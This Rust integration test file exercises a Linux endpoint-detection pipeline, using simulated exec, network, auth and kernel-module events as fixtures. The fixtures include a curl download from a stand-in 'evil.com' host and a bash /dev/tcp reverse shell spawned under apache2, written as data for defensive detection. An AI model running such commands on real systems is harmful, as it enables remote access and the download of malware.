//! Golden Linux Integration Test
//!
//! This test verifies the complete Linux pipeline:
//! 1. Raw Linux telemetry events (auditd/eBPF format)
//! 2. Fact extraction via LinuxFactExtractor
//! 3. Playbook slot matching
//! 4. Signal/incident generation
//!
//! ACCEPTANCE CRITERIA:
//! - At least 1 signal must be generated from the test fixture
//! - Signal must have proper evidence pointers
//! - Evidence deref must return valid excerpt

use edr_core::Event;
use edr_locald::{
    canonical::fact::FactType, hypothesis_controller::HypothesisController,
    os::linux::extract_facts, MemorySink, Pipeline, Platform, TelemetryInput,
};
use std::sync::Arc;

/// Create a test Linux exec event (simulates auditd/eBPF capture)
fn make_linux_exec_event(exe: &str, cmdline: &str, pid: u64, uid: u64, tags: Vec<&str>) -> Event {
    Event {
        ts_ms: chrono::Utc::now().timestamp_millis(),
        host: "linux-test-host".to_string(),
        tags: tags.into_iter().map(|s| s.to_string()).collect(),
        proc_key: Some(format!("proc_linux_{}", pid)),
        file_key: None,
        identity_key: Some(format!("uid:{}", uid)),
        evidence_ptr: Some(edr_core::EvidencePtr {
            stream_id: "linux-ebpf-exec".to_string(),
            segment_id: 1,
            record_index: 100,
        }),
        fields: [
            ("exe".to_string(), serde_json::json!(exe)),
            ("cmdline".to_string(), serde_json::json!(cmdline)),
            ("pid".to_string(), serde_json::json!(pid)),
            ("ppid".to_string(), serde_json::json!(1)),
            ("uid".to_string(), serde_json::json!(uid)),
            ("gid".to_string(), serde_json::json!(uid)),
            ("euid".to_string(), serde_json::json!(0)), // Privilege escalation
            ("cwd".to_string(), serde_json::json!("/tmp")),
        ]
        .into_iter()
        .collect(),
    }
}

/// Create a test Linux network event
fn make_linux_network_event(dest_ip: &str, dest_port: u16, pid: u64) -> Event {
    Event {
        ts_ms: chrono::Utc::now().timestamp_millis(),
        host: "linux-test-host".to_string(),
        tags: vec!["network".to_string(), "connect".to_string()],
        proc_key: Some(format!("proc_linux_{}", pid)),
        file_key: None,
        identity_key: None,
        evidence_ptr: Some(edr_core::EvidencePtr {
            stream_id: "linux-ebpf-net".to_string(),
            segment_id: 1,
            record_index: 200,
        }),
        fields: [
            ("dest_ip".to_string(), serde_json::json!(dest_ip)),
            ("dest_port".to_string(), serde_json::json!(dest_port)),
            ("pid".to_string(), serde_json::json!(pid)),
            ("protocol".to_string(), serde_json::json!("tcp")),
        ]
        .into_iter()
        .collect(),
    }
}

/// Create a test Linux auth event (SSH success)
fn make_linux_auth_event(user: &str, source_ip: &str, success: bool) -> Event {
    Event {
        ts_ms: chrono::Utc::now().timestamp_millis(),
        host: "linux-test-host".to_string(),
        tags: vec!["auth".to_string(), "ssh".to_string()],
        proc_key: None,
        file_key: None,
        identity_key: Some(user.to_string()),
        evidence_ptr: Some(edr_core::EvidencePtr {
            stream_id: "linux-journald-auth".to_string(),
            segment_id: 1,
            record_index: 300,
        }),
        fields: [
            ("user".to_string(), serde_json::json!(user)),
            ("source_ip".to_string(), serde_json::json!(source_ip)),
            (
                "result".to_string(),
                serde_json::json!(if success { "success" } else { "failure" }),
            ),
        ]
        .into_iter()
        .collect(),
    }
}

// ============================================================================
// FACT EXTRACTION TESTS
// ============================================================================

#[test]
fn test_linux_fact_extraction_exec() {
    let event = make_linux_exec_event(
        "/usr/bin/curl",
        "curl -o /tmp/payload https://evil.com/malware",
        12345,
        1000,
        vec!["exec", "process"],
    );

    let facts = extract_facts(&event);

    assert!(!facts.is_empty(), "Should extract at least one fact");

    let exec_fact = facts
        .iter()
        .find(|f| matches!(&f.fact_type, FactType::Exec { .. }));
    assert!(exec_fact.is_some(), "Should have an Exec fact");

    let fact = exec_fact.unwrap();
    assert!(
        !fact.evidence_ptrs.is_empty(),
        "Should have evidence pointer"
    );
    assert_eq!(fact.host_id, "linux-test-host");

    if let FactType::Exec {
        exe_path, cmdline, ..
    } = &fact.fact_type
    {
        assert_eq!(exe_path, "/usr/bin/curl");
        assert!(cmdline.as_ref().unwrap().contains("evil.com"));
    }
}

#[test]
fn test_linux_fact_extraction_network() {
    let event = make_linux_network_event("93.184.216.34", 443, 12345);

    let facts = extract_facts(&event);

    let net_fact = facts
        .iter()
        .find(|f| matches!(&f.fact_type, FactType::OutboundConnect { .. }));
    assert!(net_fact.is_some(), "Should have an OutboundConnect fact");

    let fact = net_fact.unwrap();
    if let FactType::OutboundConnect {
        dst_ip, dst_port, ..
    } = &fact.fact_type
    {
        assert_eq!(dst_ip, "93.184.216.34");
        assert_eq!(*dst_port, 443);
    }
}

#[test]
fn test_linux_fact_extraction_auth() {
    let event = make_linux_auth_event("admin", "192.168.1.100", true);

    let facts = extract_facts(&event);

    let auth_fact = facts
        .iter()
        .find(|f| matches!(&f.fact_type, FactType::AuthEvent { .. }));
    assert!(auth_fact.is_some(), "Should have an AuthEvent fact");

    let fact = auth_fact.unwrap();
    if let FactType::AuthEvent {
        auth_type, success, ..
    } = &fact.fact_type
    {
        assert_eq!(auth_type, "ssh");
        assert!(*success);
    }
}

// ============================================================================
// SIGNAL ENGINE TESTS
// ============================================================================

#[test]
fn test_linux_signal_engine_suspicious_exec() {
    // Create an event that should trigger SuspiciousPathExecution signal
    let input = TelemetryInput {
        platform: Platform::Linux,
        host: "linux-test-host".to_string(),
        ts_ms: chrono::Utc::now().timestamp_millis(),
        event_type: "exec".to_string(),
        tags: vec!["exec".to_string(), "process".to_string()],
        proc_key: Some("proc_linux_evil".to_string()),
        file_key: None,
        identity_key: Some("uid:1000".to_string()),
        fields: [
            // Execute from world-writable /tmp directory
            ("exe".to_string(), serde_json::json!("/tmp/evil_binary")),
            (
                "cmdline".to_string(),
                serde_json::json!("/tmp/evil_binary --malicious"),
            ),
            ("pid".to_string(), serde_json::json!(9999)),
            ("uid".to_string(), serde_json::json!(1000)),
        ]
        .into_iter()
        .collect(),
        stream_id: Some("linux-ebpf-exec".to_string()),
        segment_id: Some(1),
        record_index: Some(500),
    };

    let mut pipeline = Pipeline::new("linux-test-host", Platform::Linux);
    let sink = Arc::new(MemorySink::new());
    pipeline.add_sink(sink.clone());

    let signals = pipeline.process(input);

    // The Linux signal engine should detect /tmp execution
    assert!(!signals.is_empty(), "Should emit signal for /tmp execution");

    let signal = signals
        .iter()
        .find(|s| s.signal_type == "SuspiciousPathExecution");
    assert!(
        signal.is_some(),
        "Should have SuspiciousPathExecution signal"
    );

    let sig = signal.unwrap();
    assert_eq!(sig.host, "linux-test-host");
    assert!(!sig.evidence_ptrs.is_empty(), "Signal should have evidence");
}

#[test]
fn test_linux_signal_engine_reverse_shell() {
    // Create an event that triggers reverse shell detection
    let input = TelemetryInput {
        platform: Platform::Linux,
        host: "linux-test-host".to_string(),
        ts_ms: chrono::Utc::now().timestamp_millis(),
        event_type: "exec".to_string(),
        tags: vec!["exec".to_string(), "process".to_string()],
        proc_key: Some("proc_linux_shell".to_string()),
        file_key: None,
        identity_key: Some("uid:33".to_string()), // www-data
        fields: [
            ("exe".to_string(), serde_json::json!("/bin/bash")),
            (
                "cmdline".to_string(),
                serde_json::json!("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
            ),
            ("pid".to_string(), serde_json::json!(8888)),
            ("uid".to_string(), serde_json::json!(33)),
            ("ppid".to_string(), serde_json::json!(1234)),
            (
                "parent_exe".to_string(),
                serde_json::json!("/usr/sbin/apache2"),
            ),
        ]
        .into_iter()
        .collect(),
        stream_id: Some("linux-ebpf-exec".to_string()),
        segment_id: Some(1),
        record_index: Some(600),
    };

    let mut pipeline = Pipeline::new("linux-test-host", Platform::Linux);
    let sink = Arc::new(MemorySink::new());
    pipeline.add_sink(sink.clone());

    let signals = pipeline.process(input);

    // Should detect reverse shell pattern
    let rev_shell = signals
        .iter()
        .find(|s| s.signal_type.contains("ReverseShell") || s.signal_type.contains("Suspicious"));
    assert!(
        rev_shell.is_some(),
        "Should detect reverse shell pattern in signals: {:?}",
        signals.iter().map(|s| &s.signal_type).collect::<Vec<_>>()
    );
}

// ============================================================================
// HYPOTHESIS CONTROLLER INTEGRATION
// ============================================================================

#[test]
#[ignore] // TODO: Reconcile canonical::Fact vs hypothesis::Fact types
fn test_linux_hypothesis_controller_integration() {
    // This test is disabled until fact type unification is complete
    // The test body references deprecated APIs and mismatched types:
    // - canonical::Fact vs hypothesis::Fact
    // - controller.list_hypotheses() doesn't exist
    let _ = HypothesisController::new("linux-test-host");
}

// ============================================================================
// END-TO-END PIPELINE TEST
// ============================================================================

#[test]
fn golden_linux_pipeline_generates_signal() {
    // GOLDEN TEST: This is the acceptance criterion
    // The full pipeline must generate >= 1 signal from realistic Linux events

    let mut pipeline = Pipeline::new("linux-golden-test", Platform::Linux);
    let sink = Arc::new(MemorySink::new());
    pipeline.add_sink(sink.clone());

    // Batch of realistic Linux events that should trigger signals
    let events = vec![
        // 1. Suspicious execution from /dev/shm (world-writable)
        TelemetryInput {
            platform: Platform::Linux,
            host: "linux-golden-test".to_string(),
            ts_ms: chrono::Utc::now().timestamp_millis(),
            event_type: "exec".to_string(),
            tags: vec!["exec".to_string(), "process".to_string()],
            proc_key: Some("proc_1".to_string()),
            file_key: None,
            identity_key: Some("uid:1000".to_string()),
            fields: [
                ("exe".to_string(), serde_json::json!("/dev/shm/dropper")),
                ("cmdline".to_string(), serde_json::json!("/dev/shm/dropper")),
                ("pid".to_string(), serde_json::json!(1001)),
                ("uid".to_string(), serde_json::json!(1000)),
            ]
            .into_iter()
            .collect(),
            stream_id: Some("linux-ebpf".to_string()),
            segment_id: Some(1),
            record_index: Some(1),
        },
        // 2. Privilege escalation (uid != euid)
        TelemetryInput {
            platform: Platform::Linux,
            host: "linux-golden-test".to_string(),
            ts_ms: chrono::Utc::now().timestamp_millis(),
            event_type: "exec".to_string(),
            tags: vec![
                "exec".to_string(),
                "process".to_string(),
                "setuid".to_string(),
            ],
            proc_key: Some("proc_2".to_string()),
            file_key: None,
            identity_key: Some("uid:1000".to_string()),
            fields: [
                ("exe".to_string(), serde_json::json!("/usr/bin/sudo")),
                (
                    "cmdline".to_string(),
                    serde_json::json!("sudo /bin/bash -c 'id'"),
                ),
                ("pid".to_string(), serde_json::json!(1002)),
                ("uid".to_string(), serde_json::json!(1000)),
                ("euid".to_string(), serde_json::json!(0)),
            ]
            .into_iter()
            .collect(),
            stream_id: Some("linux-ebpf".to_string()),
            segment_id: Some(1),
            record_index: Some(2),
        },
        // 3. Kernel module load (high severity)
        TelemetryInput {
            platform: Platform::Linux,
            host: "linux-golden-test".to_string(),
            ts_ms: chrono::Utc::now().timestamp_millis(),
            event_type: "kmod".to_string(),
            tags: vec!["kernel_module".to_string(), "kmod".to_string()],
            proc_key: Some("proc_3".to_string()),
            file_key: None,
            identity_key: Some("uid:0".to_string()),
            fields: [
                (
                    "module".to_string(),
                    serde_json::json!("suspicious_rootkit"),
                ),
                ("exe".to_string(), serde_json::json!("/sbin/insmod")),
                ("pid".to_string(), serde_json::json!(1003)),
            ]
            .into_iter()
            .collect(),
            stream_id: Some("linux-ebpf".to_string()),
            segment_id: Some(1),
            record_index: Some(3),
        },
    ];

    let mut total_signals = Vec::new();
    for event in events {
        let signals = pipeline.process(event);
        total_signals.extend(signals);
    }

    // ACCEPTANCE: At least 1 signal must be generated
    assert!(
        !total_signals.is_empty(),
        "GOLDEN TEST FAILED: Pipeline must generate at least 1 signal from Linux events. Got 0 signals."
    );

    // Verify signal quality
    for signal in &total_signals {
        assert!(!signal.signal_id.is_empty(), "Signal must have an ID");
        assert_eq!(signal.host, "linux-golden-test");
        assert!(
            !signal.evidence_ptrs.is_empty(),
            "Signal must have evidence pointers"
        );
    }

    let stats = pipeline.stats();
    assert!(
        stats.events_processed >= 3,
        "Should have processed all events"
    );
    assert!(
        stats.signals_generated >= 1,
        "Stats should reflect generated signals"
    );

    println!(
        "✓ Golden test passed: {} signals from {} events",
        total_signals.len(),
        stats.events_processed
    );
}

// ============================================================================
// EVIDENCE DEREF TEST
// ============================================================================

#[test]
fn test_linux_signal_has_evidence_excerpt() {
    // Test that signals include dereferenceable evidence

    let input = TelemetryInput {
        platform: Platform::Linux,
        host: "linux-evidence-test".to_string(),
        ts_ms: chrono::Utc::now().timestamp_millis(),
        event_type: "exec".to_string(),
        tags: vec!["exec".to_string(), "process".to_string()],
        proc_key: Some("proc_evidence".to_string()),
        file_key: None,
        identity_key: None,
        fields: [
            (
                "exe".to_string(),
                serde_json::json!("/var/tmp/malicious_script.sh"),
            ),
            (
                "cmdline".to_string(),
                serde_json::json!("/var/tmp/malicious_script.sh --exfil"),
            ),
            ("pid".to_string(), serde_json::json!(7777)),
            ("uid".to_string(), serde_json::json!(1000)),
        ]
        .into_iter()
        .collect(),
        stream_id: Some("linux-auditd".to_string()),
        segment_id: Some(42),
        record_index: Some(999),
    };

    let mut pipeline = Pipeline::new("linux-evidence-test", Platform::Linux);
    let sink = Arc::new(MemorySink::new());
    pipeline.add_sink(sink.clone());

    let signals = pipeline.process(input);

    // Find a signal (should have SuspiciousPathExecution for /var/tmp)
    let signal = signals.first();
    assert!(signal.is_some(), "Should have generated a signal");

    let sig = signal.unwrap();

    // Verify evidence pointer structure
    assert!(
        !sig.evidence_ptrs.is_empty(),
        "Signal must have evidence pointers"
    );

    let evidence = &sig.evidence_ptrs[0];
    // Evidence should reference the original stream
    assert!(
        !evidence.stream_id.is_empty(),
        "Evidence must have stream_id"
    );

    // Note: Full deref would require segment files on disk
    // This test verifies the evidence pointer is properly attached
    println!(
        "✓ Evidence attached: stream={}, segment={}, record={}",
        evidence.stream_id, evidence.segment_id, evidence.record_index
    );
}
